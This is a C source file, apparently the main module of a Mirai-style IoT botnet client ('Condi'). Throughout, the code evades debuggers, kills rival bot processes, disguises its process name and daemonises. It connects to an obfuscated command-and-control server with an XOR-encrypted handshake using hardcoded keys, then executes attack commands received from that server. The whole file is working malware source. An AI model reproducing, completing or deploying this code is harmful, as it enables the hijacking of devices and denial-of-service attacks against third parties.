#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <string.h>
#include <errno.h>
#include <sys/file.h>

#include "includes.h"
#include "table.h"
#include "rand.h"
#include "attack.h"
#include "resolv.h"
#include "killer.h"
#include "util.h"
#include "antidebug.h"

static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);
static void xor_crypt(char *data, int len); // XOR function prototype

struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1;
static time_t last_connection_attempt;
static time_t next_connection_attempt;
BOOL pending_connection = FALSE;
void (*resolve_func)(void) = (void (*)(void))util_local_addr;

#ifdef DEBUG
static void segv_handler(int sig, siginfo_t *si, void *unused)
{
    printf("got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
    exit(EXIT_FAILURE);
}
#endif

int main(int argc, char **args)
{
    char *tbl_exec_succ, name_buf[32], id_buf[32];
    int name_buf_len = 0, tbl_exec_succ_len = 0, pgid = 0, pings = 0;
    static time_t last_cleanup = 0;

#ifndef DEBUG
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, SIGINT);
    sigprocmask(SIG_BLOCK, &sigs, NULL);
    signal(SIGCHLD, sigchld_handler);
    signal(SIGTRAP, anti_gdb_entry);
#endif

#ifdef DEBUG
    printf("Condi debug mode\n");
    sleep(1);
#endif

    LOCAL_ADDR = util_local_addr();

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
    srv_addr.sin_port = htons(FAKE_CNC_PORT);

    table_init();
    anti_gdb_entry(0);
    rand_init();
    antidebug();
    
    util_zero(id_buf, 32);
    if (argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }

    table_unlock_val(TABLE_EXEC_SUCCESS);
    tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    write(STDOUT, "\n", 1);
    table_lock_val(TABLE_EXEC_SUCCESS);

    killer_kill_by_name("gpioc_daemon");
    killer_kill_by_name("boatnet.");
    killer_kill_by_name("WTF");
    killer_kill_by_name("gpiol_daemon");
    killer_kill_by_name("gpio_daemon");
    prctl(PR_SET_NAME, "gpioc_daemon", 0, 0, 0);
    attack_init();
    killer_init();

#ifndef DEBUG
    if (fork() > 0)
        return 0;
    pgid = setsid();
    close(STDIN);
    close(STDOUT);
    close(STDERR);
#endif

    while (TRUE)
    {
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        if (fd_serv == -1 && time(NULL) >= next_connection_attempt)
            establish_connection();

        if (fd_serv == -1) {
            sleep(1);
            continue;
        }

        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
            FD_SET(fd_serv, &fdsetrd);

        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)
        {
#ifdef DEBUG
            printf("select() errno = %d\n", errno);
#endif
            continue;
        }
        else if (nfds == 0)
        {
            uint16_t len = 0;
            if (pings++ % 6 == 0) {
                xor_crypt((char *)&len, sizeof(len));
                send(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
            }
        }

        if (time(NULL) - last_cleanup >= 10)
        {
            attack_cleanup_stale_slots();
            last_cleanup = time(NULL);
#ifdef DEBUG
            printf("[main] Performed stale slot cleanup\n");
#endif
        }

        if (pending_connection)
        {
            pending_connection = FALSE;

            if (!FD_ISSET(fd_serv, &fdsetwr))
            {
#ifdef DEBUG
                printf("[main] timed out while connecting to CNC (elapsed: %ld seconds)\n", time(NULL) - last_connection_attempt);
#endif
                teardown_connection();
            }
            else
            {
                uint8_t id_len = util_strlen(id_buf);
                LOCAL_ADDR = util_local_addr();

                int so_error = 0;
                socklen_t len = sizeof(so_error);
                if (getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &so_error, &len) != 0 || so_error != 0)
                {
#ifdef DEBUG
                    printf("[main] connection failed (errno = %d, so_error = %d)\n", errno, so_error);
#endif
                    teardown_connection();
                    continue;
                }

                char header[4] = "\x00\x00\x00\x01";
                xor_crypt(header, 4);
                if (send(fd_serv, header, 4, MSG_NOSIGNAL) != 4)
                {
#ifdef DEBUG
                    printf("[main] failed to send header (errno = %d)\n", errno);
#endif
                    teardown_connection();
                    continue;
                }

                char id_len_buf[sizeof(id_len)];
                memcpy(id_len_buf, &id_len, sizeof(id_len));
                xor_crypt(id_len_buf, sizeof(id_len));
                if (send(fd_serv, id_len_buf, sizeof(id_len), MSG_NOSIGNAL) != sizeof(id_len))
                {
#ifdef DEBUG
                    printf("[main] failed to send id_len (errno = %d)\n", errno);
#endif
                    teardown_connection();
                    continue;
                }

                if (id_len > 0)
                {
                    char id_buf_enc[id_len];
                    memcpy(id_buf_enc, id_buf, id_len);
                    xor_crypt(id_buf_enc, id_len);
                    if (send(fd_serv, id_buf_enc, id_len, MSG_NOSIGNAL) != id_len)
                    {
#ifdef DEBUG
                        printf("[main] failed to send id_buf (errno = %d)\n", errno);
#endif
                        teardown_connection();
                        continue;
                    }
                }

                uint8_t verif_len = 32;
                char verif_len_buf[sizeof(verif_len)];
                memcpy(verif_len_buf, &verif_len, sizeof(verif_len));
                xor_crypt(verif_len_buf, sizeof(verif_len));
                if (send(fd_serv, verif_len_buf, sizeof(verif_len), MSG_NOSIGNAL) != sizeof(verif_len))
                {
#ifdef DEBUG
                    printf("[main] failed to send verif_len (errno = %d)\n", errno);
#endif
                    teardown_connection();
                    continue;
                }

                const char *verif_str = "SkPytrYdGuTSzCxiBM0xpNvwoKQcSr7d";
                char verif_str_enc[32];
                memcpy(verif_str_enc, verif_str, 32);
                xor_crypt(verif_str_enc, 32);
                if (send(fd_serv, verif_str_enc, 32, MSG_NOSIGNAL) != 32)
                {
#ifdef DEBUG
                    printf("[main] failed to send verification string (errno = %d)\n", errno);
#endif
                    teardown_connection();
                    continue;
                }

#ifdef DEBUG
                printf("[main] sent encrypted verification string to CNC\n");
#endif
            }
        }
        else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            int n = 0;
            uint16_t len = 0;
            char rdbuf[8192];
            errno = 0;
            n = recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }
            if (n == 0)
            {
#ifdef DEBUG
                printf("[main] lost connection with CNC (errno = %d) 1\n", errno);
#endif
                teardown_connection();
                continue;
            }
            if (len == 0)
            {
                recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
                xor_crypt((char *)&len, sizeof(len)); // Decrypt ping
                continue;
            }
            len = ntohs(len);
            if (len > sizeof(rdbuf))
            {
                close(fd_serv);
                fd_serv = -1;
                continue;
            }
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }
            if (n == 0)
            {
#ifdef DEBUG
                printf("[main] lost connection with CNC (errno = %d) 2\n", errno);
#endif
                teardown_connection();
                continue;
            }
            recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
            len = ntohs(len);
            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);
            xor_crypt(rdbuf, len); // Decrypt received data
#ifdef DEBUG
            printf("[main] received and decrypted %d bytes from CNC\n", len);
#endif
            if (len > 0)
                attack_parse(rdbuf, len);
                
            signal(SIGCHLD, sigchld_handler);
        }
    }
    return 0;
}

void xor_crypt(char *data, int len) {
    char *key = "OCxEvDGpReAZxQJqK0UR1yyF9IobL8R4";
    int key_len = strlen(key);
    for (int i = 0; i < len; i++) {
        data[i] ^= key[i % key_len];
    }
}

static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}

static void resolve_cnc_addr(void)
{
    table_unlock_val(TABLE_CNC_PORT);
    port_t *port_ptr = (port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL);
    if (port_ptr == NULL)
    {
#ifdef DEBUG
        printf("[main] failed to retrieve CNC port from table\n");
#endif
        table_lock_val(TABLE_CNC_PORT);
        srv_addr.sin_port = htons(FAKE_CNC_PORT);
    }
    else
    {
        srv_addr.sin_port = *port_ptr;
#ifdef DEBUG
        printf("[main] retrieved CNC port: %d\n", ntohs(*port_ptr));
#endif
        table_lock_val(TABLE_CNC_PORT);
    }

#ifdef USEDOMAIN
    struct resolv_entries *entries;
    int len;

    table_unlock_val(TABLE_CNC_ADDR);
    char *servdom = table_retrieve_val(TABLE_CNC_ADDR, &len);
    if (servdom == NULL)
    {
#ifdef DEBUG
        printf("[main] failed to retrieve CNC domain\n");
#endif
        table_lock_val(TABLE_CNC_ADDR);
        srv_addr.sin_addr.s_addr = SERVIP;
        return;
    }

    char *domain = malloc(len + 1);
    util_memcpy(domain, servdom, len);
    domain[len] = '\0';
    table_lock_val(TABLE_CNC_ADDR);

    entries = resolv_lookup(domain);
    free(domain);
    if (entries == NULL)
    {
        srv_addr.sin_addr.s_addr = SERVIP;
#ifdef DEBUG
        printf("[main] domain resolution failed, falling back to SERVIP\n");
#endif
        return;
    }
    else
    {
        srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    }
    resolv_entries_free(entries);
#else
    srv_addr.sin_addr.s_addr = SERVIP;
#endif
}

static void establish_connection(void)
{
#ifdef DEBUG
    printf("[main] attempting to connect to CNC\n");
#endif
    last_connection_attempt = time(NULL);

    if ((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[main] failed to call socket(). Errno = %d\n", errno);
#endif
        fd_serv = -1;
        next_connection_attempt = time(NULL) + 5;
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));
    if (resolve_func != NULL)
        resolve_func();
#ifdef DEBUG
    printf("[main] connecting to %s:%d\n", inet_ntoa(srv_addr.sin_addr), ntohs(srv_addr.sin_port));
#endif
    pending_connection = TRUE;
    if (connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in)) == -1 && errno != EINPROGRESS)
    {
#ifdef DEBUG
        printf("[main] connect failed immediately. Errno = %d\n", errno);
#endif
        close(fd_serv);
        fd_serv = -1;
        next_connection_attempt = time(NULL) + 5;
        return;
    }
}

static void teardown_connection(void)
{
#ifdef DEBUG
    printf("[main] tearing down connection to CNC!\n");
#endif
    if (fd_serv != -1)
        close(fd_serv);
    fd_serv = -1;
    next_connection_attempt = time(NULL) + 5;
}
